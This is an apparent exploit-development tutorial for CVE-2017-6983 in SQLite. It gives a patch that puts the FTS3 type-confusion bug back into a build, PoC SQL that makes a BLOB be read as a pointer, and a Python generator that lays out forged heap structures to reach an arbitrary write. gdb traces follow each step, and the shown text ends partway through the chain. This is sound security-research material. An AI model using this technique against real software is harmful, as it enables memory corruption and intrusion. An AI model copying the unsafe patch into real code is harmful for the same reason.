# CVE-2017-6983 Explained

CVE-2017-6983 is a type-confusion vulnerability in SQLite that enables an attacker to gain an arbitrary memory-write primitive. This bug has been exploited in various attack scenarios due to SQLite's widespread integration across software platforms, including in MacOS system components. A detailed technical analysis and real-world exploitation of this vulnerability were presented at Black Hat USA 2017:

* *Many Birds, One Stone: Exploiting a Single SQLite Vulnerability Across Multiple Software*. ([Video](https://www.youtube.com/watch?v=Kqv8S1BQYwE&ab_channel=BlackHat)) ([Slides p39-p60](https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf))

In this blog, I go beyond the initial crash to develop a fully working exploit based on this bug (without ASLR bypass).


# Source Code

To begin analyzing or experimenting with CVE-2017-6983, you will need a specific version of the SQLite source code. The following steps show how to retrieve and build SQLite version 3.40.1, which maps to commit `1fdaa9d1a7`.

```bash
$ git clone https://github.com/sqlite/sqlite.git
$ cd sqlite
$ git checkout version-3.40.1  # commit 1fdaa9d1a7
```

Next, compile the source code to generate the `sqlite3.c` and `shell.c` files. These are essential for debugging and investigations.

```bash
$ CC="clang -DSQLITE_DEBUG" ./configure --enable-debug
$ make
$ ls -l sqlite3.c shell.c
```

> **Note**: The `-DSQLITE_DEBUG` flag enables internal assertions and debugging helpers, which can be used for identified misuse of internal SQLite APIs.

> **Why version 3.40.1?** Although CVE-2017-6983 was disclosed in 2017, I chose version 3.40.1 (released in 2022) for this analysis because it was the latest version at the time of my investigation.


# Reintroducing the Vulnerability

SQLite version 3.40.1 has already patched CVE-2017-6983. However, for demonstration and research purposes, we manually reintroduce the bug by modifying the source code. The following patch restores the vulnerable behavior inside the `fts3FunctionArg` function.

> **Warning**: This patch reintroduces a serious memory corruption bug. You should never apply this patch to any production or non-isolated environment. It is intended for testing and educational use in a controlled setting.


```c
// sqlite3.c

static int fts3FunctionArg(
  sqlite3_context *pContext,      /* SQL function call context */
  const char *zFunc,              /* Function name */
  sqlite3_value *pVal,            /* argv[0] passed to function */
  Fts3Cursor **ppCsr              /* OUT: Store cursor handle here */
){
  int rc;
  /* Insert Vuln */
+ Fts3Cursor *pRet;
+ memcpy(&pRet, sqlite3_value_blob(pVal), sizeof(Fts3Cursor *));
+ *ppCsr = pRet;
- *ppCsr = (Fts3Cursor*)sqlite3_value_pointer(pVal, "fts3cursor");
  if( (*ppCsr)!=0 ){
    rc = SQLITE_OK;
  }else{
    char *zErr = sqlite3_mprintf("illegal first argument to %s", zFunc);
    sqlite3_result_error(pContext, zErr, -1);
    sqlite3_free(zErr);
    rc = SQLITE_ERROR;
  }
  return rc;
}
```

Once this modification is in place, recompile SQLite.

```bash
$ make
```

> **What does this patch do?** The safe version users `sqlite3_value_pointer()` to safely retrieve a typed pointe with a tag ("fts3cursor"). By replacing it with `sqlite3_value_blob()` and `memcpy()`, we remove the type safety and allow arbitrary pointer casting, which reintroduces the type confusion vulnerability that enables an attacker-controlled pointer to be passed into internal SQLite structure.


# Nice Feature: Virtual Table

SQLite is originally designed to manage traditional SQL tables, which are structured collections of rows and columns. However, to expand its usability, SQLite introduces a powerful feature called **virtual tables**, which allow developers to interface with non-tabular data (such as files or documents) using familiar SQL syntax.

A virtual table, as the name suggests, is not a real SQL table. Instead, it is an abstraction provided by a user-defined SQL extension that handles custom data backend. When creating a virtual table, we need to specify the underlying extension module that implements its behavior. For example, **FTS3** is an extension that enables full-text search (FTS) over unstructured text data. When we issue SQL commands like `CREATE`, `INSERT` or `SELECT` on a virtual table, SQLite defers execution to callback functions provided by the related extension, which bypasses its usual SQL storage and processing layers.

So far, so good.

But here is where things get interesting.

When we insert data into a virtual table, it often gets stored in the form of a `BLOB` (binary large object). The BLOB data itself is opaque to SQLite since it is simply stores raw binary data. The extension knows how to interpret this data because it defines its own internal structure. When inserting, the extension serializes its expected structure into a BLOB. When selecting from the table, it deserializes the BLOB based on that same structure.

Now imagine this: what happens if an attacker forges a BLOB and tricks the extension into loading it?

Simple but dangerous. The extension blindly trusts the BLOB and interprets its content based on its internal layout. If the layout expects a pointer at offset X, it will read the value at that offset and treat it as a real pointer, even if it was crafted by the attacker.

This is exactly the root of CVE-2017-6983.

This vulnerability arises when an attacker-controlled BLOB is misinterpreted by the extension, resulting in type confusion and potentially leading to arbitrary memory writes or reads.

So far, too good, for attackers unfortunately.


# PoC0: Control a Pointer

This proof of concept (PoC) demonstrates how an attacker can control a pointer passed to an internal FTS3 function by exploiting the type confusion vulnerability.

```sql
create virtual table a using fts3(b);
insert into a values(x'aabbccdd');
select optimize(b) from a;
```

Step-by-step breakdown:

1. Create a virtual table `a` using the FTS3 extension with a single column `b`.

2. Insert a raw 4-byte BLOB `x'aabbccdd'`, which will be misinterpreted as a pointer  in `fts3FunctionArg()`.

3. Trigger the vulnerability. The `select optimize(b) from a` statement calls the `optimize` function with the column value `b` as its argument. Because `b` is a BLOB and the patched type tag check was removed, the extension treats the raw data `0xddccbbaa` (big endian) as a valid `Fts3Cursor` pointer.

As a result, the extension dereferences an attacker-controlled pointer, leading to a segmentation fault (or worse, arbitrary memory access). Run this PoC with the modified (vulnerable) SQLite binary.

```bash
# save the above SQL as /tmp/exp0
$ ./sqlite < /tmp/exp0
Segmentation fault (core dumped)
```

> **Note**: The crash confirms that the function `optimize()` is dereferencing the forged pointer (`0xddccbbaa`), validating the type confusion vulnerability.

Let's confirm the crash and inspect what is happening behind the scenes using GDB.

```bash
$ gdb ./sqlite3
(gdb) r < /tmp/exp0
Program received signal SIGSEGV, Segmentation fault.
0x00000000005b3d4a in fts3OptimizeFunc (pContext=0x664e80, nVal=1, apVal=0x664eb0) at sqlite3.c:182454
```

We immediately hit a segmentation fault in `fts3OpitmizeFunc`. Let's check what the extension thought `pCursor` is.

```bash
182454    p = (Fts3Table *)pCursor->base.pVtab;
(gdb) p pCursor
$1 = (Fts3Cursor *) 0xddccbbaa
```

As expected, the value `0xddccbbaa` is exactly the BLOB we insert. The value is blindly interpreted as a pointer by the vulnerable `fts3FunctionArg()` function.

To better understand the call flow and crash location, letâ€™s inspect the stack trace:

```bash
(gdb) bt
#0  0x00000000005b3d4a in fts3OptimizeFunc (pContext=0x664e80, nVal=1, apVal=0x664eb0) at sqlite3.c:182454
#1  0x00000000004b34ae in sqlite3VdbeExec (p=0x662a20) at sqlite3.c:98127
#2  0x00000000004549ed in sqlite3Step (p=0x662a20) at sqlite3.c:88072
#3  0x000000000044c267 in sqlite3_step (pStmt=0x662a20) at sqlite3.c:88133
#4  0x000000000043e63e in exec_prepared_stmt (pArg=0x7fffffffcf68, pStmt=0x662a20) at shell.c:18074
#5  0x0000000000418677 in shell_exec (pArg=0x7fffffffcf68, zSql=0x64f430 "select optimize(b) from a;", pzErrMsg=0x7fffffffcd50) at shell.c:18390
#6  0x00000000004428ff in runOneSqlLine (p=0x7fffffffcf68, zSql=0x64f430 "select optimize(b) from a;", in=0x7ffff7c1aaa0 <_IO_2_1_stdin_>, startline=4) at shell.c:25400
#7  0x000000000041934d in process_input (p=0x7fffffffcf68) at shell.c:25564
#8  0x000000000040b9df in main (argc=1, argv=0x7fffffffe308) at shell.c:26419
```

And here is the code around the crashing instruction.

```bash
(gdb) l
182449
182450    UNUSED_PARAMETER(nVal);
182451
182452    assert( nVal==1 );
182453    if( fts3FunctionArg(pContext, "optimize", apVal[0], &pCursor) ) return;
182454    p = (Fts3Table *)pCursor->base.pVtab;
182455    assert( p );
182456
182457    rc = sqlite3Fts3Optimize(p);
182458
```

The cash occurs  at line 182454 of sqlite3.c, where the following instruction attempts to dereference a structure field:

```c
182454    p = (Fts3Table *)pCursor->base.pVtab;
```

The line immediately above it calls `fts3FunctionArg()`.

```c
182453    if( fts3FunctionArg(pContext, "optimize", apVal[0], &pCursor) ) return;
```

As shown in the [Reintroducing the Vulnerability](#reintroducing-the-vulnerability) section, this function is where we manually patch the code to reintroduce the type confusion bug. Specifically, we replace a type-safe pointer cast (`sqlite3_value_pointer`) with a raw memory read (`sqlite3_value_blob` + `memcpy`).

Without diving too deeply into SQLite internals, it is reasonable to infer that function `fts3OpitmizeFunc` is the handler function responsible for processing the SQL call to `optimize`. Since we pass `b` as the argument in our `select` query, the extension retrieves the value of column `b` through `fts3FunctionArg`, and uses it as an `Fts3Cursor *` in function `fts3OptimizeFunc`.

* In the vulnerable version (after our patch), SQLite uses `sqlite3_value_blob` to obtain raw bytes, and uses `memcpy` to cast them to a `Fts3Cursor *`, trusting the BLOB's contents. It only checks that the input has BLOB type.

* In the safe version, SQLite uses `sqlite3_value_pointer` to extract a pointer, which verifies that the value is originally stored as a tagged pointer of the expected type.

Anyway, in the vulnerable build, we (acting as the attacker) have full control over the `pCursor` pointer inside `fts3optimizeFunc`. Starting from this function, we will turn the bug into an arbitrary-write primitive.

# PoC1: Control Everything

Controlling a single pointer is not enough to fully exploit this vulnerability. In this step, we aim to control not just `pCursor`, but also the memory it points to, and any pointers or values further dereferenced from it.

We notice that `pCursor` is used in the following code, like line `182454`, to retrieve a pointer `p` from `pCursor`-pointed memory content. To control `p`, we need to make `pCursor` pointing to some location that is completely under our control. The idea is to inject more malicious content into SQLite memory space, and make `pCursor` and following pointers pointing to this malicious content.

We make use of the SQL query to achieve the malicious content injection. Particularly, we want to inject a lot of BLOB data into another table.

```sql
create table t1(c1 char);
insert into t1 values(x'very-long-malicious-blob-data');

create virtual table a using fts3(b);
insert into a values(x'aabbccdd');
select optimize(b) from a;
```

The SQL query above shows our idea. Before triggering the bug (the bottom half), we first insert a large malicious blob data into another table. Then, we search this malicious block data from SQLite memory to identify its address. We will use its address for `pCursor`. Since this data is very long and may contain non-printable character, we use a python script to generate this poc automatically.

```py
#!/usr/bin/env python3

import os
import sys

with open('/tmp/exp', 'w') as f:
    f.write("create table t1(c1 char);\n")
    f.write("insert into t1 values(x'" + exp + "');\n")
    f.write("create virtual table a using fts3(b);\n")
    f.write("insert into a values(x'" + valToStr(base, 8) + "');\n")
    f.write("select optimize(b) from a;\n")
```

* `exp` is the long, malicious blob data, to be determined (TBD)
* `base` is the address of this blob data in memory, TBD
* `valToStr` is a function that translate an integer into big-endian string representation

Here is the implementation of `valtoStr`

```py
def valToStr(value, length):
    b = '{num:0{width}X}'.format(num=value, width=length * 2)
    c = "".join(reversed([b[i:i+2] for i in range(0, len(b), 2)]))
    return c
```

At the beginning, we just set `exp` to a large benign content and set `base` to an arbitrary value.

```py
exp = valToStr(0xdeadbeef, 8) + "0" * 0x800 * 2
base = 0xaabbccdd
```

Combing everything together, and run the script

```bash
# say the script is poc.py
$ python3 ./poc.py    # --> this will produce /tmp/exp file
$ gdb ./sqlite3
(gdb) b fts3OptimizeFunc
(gdb) r < /tmp/exp
...
Breakpoint 1, fts3OptimizeFunc (pContext=0x664700, nVal=0x1, apVal=0x664730) at sqlite3.c:182452
182452    assert( nVal==1 );
```

At this moment, we are going to invoke the vulnerable function. Here we will search where is the BLOB content provided in `exp`. Since we use `0xdeadbeef` as the starting value, we will search for this value within the SQLite memory space. To simplify this search, we switch to [gdb-peda](https://github.com/longld/peda) tool, which is a customized GDB plugin providing a set of facilities. To install it, just simply follow the instruction on its GitHub repository.

```bash
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```

After this simple installation, we already have `gdb-peda` installed.


```bash
$ gdb ./sqlite
gdb-peda $                 # <--- if get this prompt, it means gdb-peda is ready
```

To make the reading easier, I will use `(gdb-peda)` as the prompt. Let's continue our exploration.

```bash
$ gdb ./sqlite3
(gdb-peda) b fts3OptimizeFunc
(gdb-peda) r < /tmp/exp
Breakpoint 1, fts3OptimizeFunc (pContext=0x664700, nVal=0x1, apVal=0x664730) at sqlite3.c:182452
182452    assert( nVal==1 );
(gdb-peda) searchmem 0xdeadbeef
Searching for '0xdeadbeef' in: None ranges
Found 1 results, display max 1 items:
[heap] : 0x667ad8 --> 0xdeadbeef
(gdb-peda) x/100bx 0x667ad8
0x667ad8:       0xef    0xbe    0xad    0xde    0x00    0x00    0x00    0x00
0x667ae0:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

We can see that the SQLite process only contains one copy of this data, which starts from address `0x667ad8`. We should replace `base` with this value.


```py
exp = valToStr(0xdeadbeef, 8) + "0" * 0x800 * 2
base = 0x667ad8
```

Run again

```bash
$ python3 ./poc.py
$ gdb ./sqlite3
(gdb-peda) b sqlite3.c:182454
Breakpoint 1 at 0x5b3d46: file sqlite3.c, line 182454.
(gdb-peda) r < /tmp/exp
Breakpoint 1, fts3OptimizeFunc (pContext=0x664700, nVal=0x1, apVal=0x664730) at sqlite3.c:182454
182454    p = (Fts3Table *)pCursor->base.pVtab;
(gdb-peda) p pCursor
$1 = (Fts3Cursor *) 0x667ad8
(gdb-peda) x/100bx pCursor
0x667ad8:       0xef    0xbe    0xad    0xde    0x00    0x00    0x00    0x00
0x667ae0:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667ae8:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667af0:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667af8:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b00:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b08:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b10:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b18:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b20:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b28:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b30:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b38:       0x00    0x00    0x00    0x00
```

OK, great. Now `pCurosr` is pointing to the long, malicious BLOB content. We can change `exp` as we want to control any variable dereferenced from `pCursor`.

Define another two python functions to help update `exp` to whatever we want. The complete PoC1 is as follows.

```py
#!/usr/bin/env python3

import os
import sys

def valToStr(value, length):
    b = '{num:0{width}X}'.format(num=value, width=length * 2)
    c = "".join(reversed([b[i:i+2] for i in range(0, len(b), 2)]))
    return c

def writeStr(exp, off, string):
    exp = list(exp)
    string = list(string)
    for i in range(0, len(string)):
        exp[off + i] = string[i]
    return ''.join(exp)

def writeVal(exp, off, value, length):
    # value = hex(value)
    # print(value)
    return writeStr(exp, off * 2, valToStr(value, length))

exp = valToStr(0xdeadbeef, 8) + "0" * 0x800 * 2
base = 0x667ad8

############################################################# 
# TODO: update exp properly to change the malicious content #
#############################################################

with open('/tmp/exp', 'w') as f:
    f.write("create table t1(c1 char);\n")
    f.write("insert into t1 values(x'" + exp + "');\n")
    f.write("create virtual table a using fts3(b);\n")
    f.write("insert into a values(x'" + valToStr(base, 8) + "');\n")
    f.write("select optimize(b) from a;\n")
```

# PoC2: write-what-where

Next, our goal is to achieve a primitive that allows us to write arbitrary value into arbitrary location, known as [write-what-where](https://cwe.mitre.org/data/definitions/123.html).

### 1. sqlite3Fts3Optimize

What we have done is to make `pCursor` pointing to our malicious blob data. SQLite will treat the pointed memory as an `Fts3Cursor` object. 

```txt
############################################################# 
# Fts3Cursor (0x80)
#############################################################
```

The size of this object `sizeof(Fts3Cursor)` is 0x80. We can get this size via `p sizeof(Fts3Cursor)` within `gdb-peda`.

```bash
(gdb-peda) p sizeof(Fts3Cursor)
0x80
```

SQLite is going to execute the following lines.

```c
182454   p = (Fts3Table *)pCursor->base.pVtab;
182455   assert( p );
182456
182457   rc = sqlite3Fts3Optimize(p);
```

Within `Fts3Cursor`, `base.pVtab` is at offset 0. We can obtain this offset via `gdb-peda`

```bash
(gdb-peda) p &((Fts3Cursor *)0)->base.pVtab
$2 = (sqlite3_vtab **) 0x0
```

Therefore, to control `p` (which is `pCursor->base.pVtab`), we need to update `exp` so that at its offset 0 the value is a pointer. We want to make this point `base + sizeof(Fts3Cursor)` so their memory content will not be overlapped.

```py
# sizeof types
Fts3Cursor_size = 0x80

# offset_type_member -> offset of member within type

# raddr -> address relative to base
#       -> offset relattive to exp
raddr_Fts3Cursor = 0

# set pVtab -> &Fts3Table -> p
offset_Fts3Cursor_pVtab = 0
p_value = base + raddr_Fts3Table
exp = writeVal(exp, raddr_Fts3Cursor + offset_Fts3Cursor_pVtab, p_value, 8)
```

After this update, we have the following memory layout.

```txt
############################################################# 
# Fts3Cursor (0x80)
# + Fts3Table (0x220)
#############################################################
+ Fts3Cursor.base.pVtable = &Fts3Table
```

### 2. sqlite3Fts3Optimize > sqlite3Fts3Optimize

The execution will go into `sqlite3Fts3Optimize`.

```c
194701 ** Flush any data in the pending-terms hash table to disk. If successful,
194702 ** merge all segments in the database (including the new segment, if
194703 ** there was any data to flush) into a single segment.
194704 */
194705 SQLITE_PRIVATE int sqlite3Fts3Optimize(Fts3Table *p){
194706   int rc;
194707   rc = sqlite3_exec(p->db, "SAVEPOINT fts3", 0, 0, 0);
194708   if( rc==SQLITE_OK ){
194709     rc = fts3DoOptimize(p, 1);
194710     if( rc==SQLITE_OK || rc==SQLITE_DONE ){
194711       int rc2 = sqlite3_exec(p->db, "RELEASE fts3", 0, 0, 0);
194712       if( rc2!=SQLITE_OK ) rc = rc2;
194713     }else{
194714       sqlite3_exec(p->db, "ROLLBACK TO fts3", 0, 0, 0);
194715       sqlite3_exec(p->db, "RELEASE fts3", 0, 0, 0);
194716     }
194717   }
194718   sqlite3Fts3SegmentsClose(p);
194719   return rc;
194720 }
```

Line `194707` invokes `sqlite3_exec`, which invokes `sqlite3SafetyCheckOk`. To simplify the attack, we set `p->db` to `0`, which forces `sqlite3SafetyCheckOk` returning 0, and in turn forces `sqlite3_exec` returns `^SQLITE_OK`.

```txt
sqlite3Fts3Optimize
    +-> sqlite3_exec
            +-> sqlite3SafetyCheckOk
            <-+ 0
    <-+ SQLITE_MISUSE_BKPT (not SQLITE_OK)
    +-> sqlite3Fts3SegmentsClose
```

Here we use this simple layout to represent what we need to achieve.

```txt
############################################################# 
# Fts3Cursor (0x80)
# Fts3Table (0x220)
#############################################################
Fts3Cursor.base.pVtable = &Fts3Table
+ Fts3Table.db = 0
```

### 3. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose


The execution now goes into `sqlite3Fts3SegmentsClose`.

```c
190157 /*
190158 ** Close the blob handle at p->pSegments, if it is open. See comments above
190159 ** the sqlite3Fts3ReadBlock() function for details.
190160 */
190161 SQLITE_PRIVATE void sqlite3Fts3SegmentsClose(Fts3Table *p){
190162   sqlite3_blob_close(p->pSegments);
190163   p->pSegments = 0;
190164 }
```

This function is very simple, which just passes `p->pSegments` into function `sqlite3_blob_close`. What we need to do is to set `p->pSegments` to next available space after `Fts3Table`, which will be treated as an `Incrblob` object.


```txt
############################################################# 
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# + Incrblob (0x38)
#############################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
+ Fts3Table.pSegments = &Incrblob
```

### 4. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close

The execution goes into `sqlite3_blob_close`.

```c
 98920 /*
 98921 ** Close a blob handle that was previously created using
 98922 ** sqlite3_blob_open().
 98923 */
 98924 SQLITE_API int sqlite3_blob_close(sqlite3_blob *pBlob){
 98925   Incrblob *p = (Incrblob *)pBlob;
 98926   int rc;
 98927   sqlite3 *db;
 98928
 98929   if( p ){
 98930     sqlite3_stmt *pStmt = p->pStmt;
 98931     db = p->db;
 98932     sqlite3_mutex_enter(db->mutex);
 98933     sqlite3DbFree(db, p);
 98934     sqlite3_mutex_leave(db->mutex);
 98935     rc = sqlite3_finalize(pStmt);
 98936   }else{
 98937     rc = SQLITE_OK;
 98938   }
 98939   return rc;
 98940 }
```

Next, we update `p->db`, which is used as a `sqlite3` pointer.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob (0x38)
# + sqlite3 (0x308)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
+ Incrblob.db = &sqlite3
```

We need to update this `sqlite3` structure to make sure `mutex` is 0

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob (0x38)
# sqlite3 (0x308)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob.db = &sqlite3
+ sqlite3.mutex = 0
```

### 5. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3DbFree

This `sqlite3` structure is also used within `sqlite3DbFree` function as the first argument `db`. At the same time, the second argument is the `Incrblob` structure. We track into this function to find more constraint.

```c
 29433 SQLITE_PRIVATE void sqlite3DbFree(sqlite3 *db, void *p){
 29434   assert( db==0 || sqlite3_mutex_held(db->mutex) );
 29435   if( p ) sqlite3DbFreeNN(db, p);
 29436 }
```

* `db==0` is always `False`.

* `sqlite3_mutex_held(db->mutex)` should be `True`.

* `p` is not `0`

### 6. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3DbFree > sqlite3DbFreeNN

So the execution will enter `sqlite3DbFreeNN` with the same arguments.

```c
 29357 SQLITE_PRIVATE void sqlite3DbFreeNN(sqlite3 *db, void *p){
 29360   if( db ){
 29361     if( ((uptr)p)<(uptr)(db->lookaside.pEnd) ){
 ...         ...
 29384     }
 29385     if( db->pnBytesFreed ){
 29386       measureAllocationSize(db, p);
 29387       return;
 29388     }
 29389   }
 ...     ...
 29395 }
```

Here are want to make sure 

1. `p<db->lookaside.pEnd` is `False`
2. `db->pnBytesFreed` is a valid integer-pointer.

So we add the following updates.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob (0x38)
# sqlite3 (0x308)
# + nBytesFreed (0x4)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob.db = &sqlite3
sqlite3.mutex = 0
+ sqlite3.lookaside.pEnd = 0
+ sqlite3.pnBytesFreed = &nBytesFreed
```

### 7. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3DbFree > sqlite3DbFreeNN > measureAllocationSize

Now the execution enters `measureAllocationSize`

```c
 29344 /*
 29345 ** Add the size of memory allocation "p" to the count in
 29346 ** *db->pnBytesFreed.
 29347 */
 29348 static SQLITE_NOINLINE void measureAllocationSize(sqlite3 *db, void *p){
 29349   *db->pnBytesFreed += sqlite3DbMallocSize(db,p);
 29350 }
```

#### Interesting Question: Can we turn this operation into an arbitrary write primitive?

> It turns out to be possible. A arbitrary write primitive requires to both address and value 
> 
>   `*address = value;`
> 
> address = db->pnBytesFreed
> 
> + completely under our control
> + no side effect
> - can only overwrite 4-byte
> 
> value = malloc_useable_size(p)
> 
> + can be controlled (need to update memory content before `p`
> - usually `& ~0x7`, which means the last 3 bits are out of control
> 
> In summary, it is possible. However, it may require significant consideration due to the limitations (-) above. 

### 8. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3DbFree > sqlite3DbFreeNN > measureAllocationSize > sqlite3DbMallocSize

Nothing special, move on to `sqlite3DbMallocSize`.

```c
 29293 SQLITE_PRIVATE int sqlite3DbMallocSize(sqlite3 *db, const void *p){
 29294   assert( p!=0 );
 29295 #ifdef SQLITE_DEBUG
 29296   if( db==0 ){
 29297     assert( sqlite3MemdebugNoType(p, (u8)~MEMTYPE_HEAP) );
 29298     assert( sqlite3MemdebugHasType(p, MEMTYPE_HEAP) );
 29299   }else if( !isLookaside(db,p) ){
 29300     assert( sqlite3MemdebugHasType(p, (MEMTYPE_LOOKASIDE|MEMTYPE_HEAP)) );
 29301     assert( sqlite3MemdebugNoType(p, (u8)~(MEMTYPE_LOOKASIDE|MEMTYPE_HEAP)) );
 29302   }
 29303 #endif
 29304   if( db ){
 29305     if( ((uptr)p)<(uptr)(db->lookaside.pTrueEnd) ){
 ...         ...
 29316     }
 29317   }
 29318   return sqlite3GlobalConfig.m.xSize((void*)p);
 29319 }
```

`isLookaside` requires extra conditions related to `p`, `sqlite3.lookaside.pStart` and `sqlite3.lookaside.pTrueEnd`. However, since `assert` is not working here at all, we can simply skip it.

We just need to make sure `p < db->lookaside.pTrueEnd` is `False`.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
+ sqlite3.lookaside.pTrueEnd = 0
```

### malloc_usable_size

`sqlite3GlobalConfig.m.xSize` will inovke `malloc_usable_size` in glibc to obtain the allocation size of `p`. Although this part is quit standard, we should be careful about one thing. Here is the code logic in `malloc_useable_size`.

```c
struct malloc_chunk {
  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
};
typedef struct malloc_chunk* malloc_chunk;

#define chunk2mem(p)   ((Void_t*)((char*)(p) + 2*SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))
/* Get size, ignoring use bits */
#define chunksize(p)         ((p)->size & ~(SIZE_BITS))
/* check for mmap()'ed chunk */
#define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)
/* extract p's inuse bit */
#define inuse(p) ((((mchunkptr)(((char*)(p))+((p)->size & ~SIZE_BITS)))->size) & PREV_INUSE)

// ------------------------- malloc_usable_size -------------------------
{
  mchunkptr p;
  if (mem != 0) {
    p = mem2chunk(mem);
    if (chunk_is_mmapped(p))
      return chunksize(p) - 2*SIZE_SZ;
    else if (inuse(p))
      return chunksize(p) - SIZE_SZ;
  }
  return 0;
}
```

This is a little complex, but we can try to make it simpler

```c

size_t malloc_usable_size(void *mem) {

  if (mem != NULL) {
    mchunkptr p = (mchunkptr) ((char *)mem - 2 * 8);
    if (p->size & 0x2)
      return p->size - 2 * 8;
    else {
      mchunkptr next = (mchunkptr) ((char *)p + p->size & ~0x7);
      if (next->size & 0x1)
        return p->size - 8;
    }
  
  }
  return 0;
}
```

Here the tricky part is that, it will check the value before this pointer. This is due to the management of heap checks in glibc, which puts metadata (like size, flags etc) before the address returned to users.

In this case, we want the code to be simple, like return 0. To do so, we need to control the 8 bytes before this pointer, and set them all to 0.

* `p->size` is 0, so we go to else block
* `next` is exactly `p`, since `p->size` is 0
* `next->size` is also 0.
* we reach the last line, which returns 0.

Therefore, we need to reserve 8 bytes before any pointer (which is `Incrblob` here).

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# + Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe (0x138)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
+ Incrblob_metadata = 0
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
sqlite3.lookaside.pTrueEnd = 0
```

The stack layout at `malloc_useable_size` is as follows.

```bash
#0  __malloc_usable_size (m=0x667d78) at ./malloc/malloc.c:5138
#1  0x000000000058e99d in sqlite3MemSize (pPrior=0x667d78) at sqlite3.c:25540
#2  0x0000000000448878 in sqlite3DbMallocSize (db=0x667db0, p=0x667d78) at sqlite3.c:29318
#3  0x000000000046a91d in measureAllocationSize (db=0x667db0, p=0x667d78) at sqlite3.c:29349
#4  0x000000000046a895 in sqlite3DbFreeNN (db=0x667db0, p=0x667d78) at sqlite3.c:29386
#5  0x0000000000448cf6 in sqlite3DbFree (db=0x667db0, p=0x667d78) at sqlite3.c:29435
#6  0x000000000045a894 in sqlite3_blob_close (pBlob=0x667d78) at sqlite3.c:98933
#7  0x000000000059505c in sqlite3Fts3SegmentsClose (p=0x667b58) at sqlite3.c:190162
#8  0x00000000005b6df1 in sqlite3Fts3Optimize (p=0x667b58) at sqlite3.c:194718
#9  0x00000000005b3d92 in fts3OptimizeFunc (pContext=0x664700, nVal=0x1, apVal=0x664730) at sqlite3.c:182457
```

### 9. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close

Now the execution go back to frame 6, which is within `sqlite3_blob_close`, line 98933.

```c
 98924 SQLITE_API int sqlite3_blob_close(sqlite3_blob *pBlob){
 98925   Incrblob *p = (Incrblob *)pBlob;
 98926   int rc;
 98927   sqlite3 *db;
 98928
 98929   if( p ){
 98930     sqlite3_stmt *pStmt = p->pStmt;
 98931     db = p->db;
 98932     sqlite3_mutex_enter(db->mutex);
 98933     sqlite3DbFree(db, p);
>98934     sqlite3_mutex_leave(db->mutex);
 98935     rc = sqlite3_finalize(pStmt);
 98936   }else{
 98937     rc = SQLITE_OK;
 98938   }
 98939   return rc;
 98940 }
```

`sqlit3_mutex_leave` just leaves the mutex.

### 10. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3_finalize
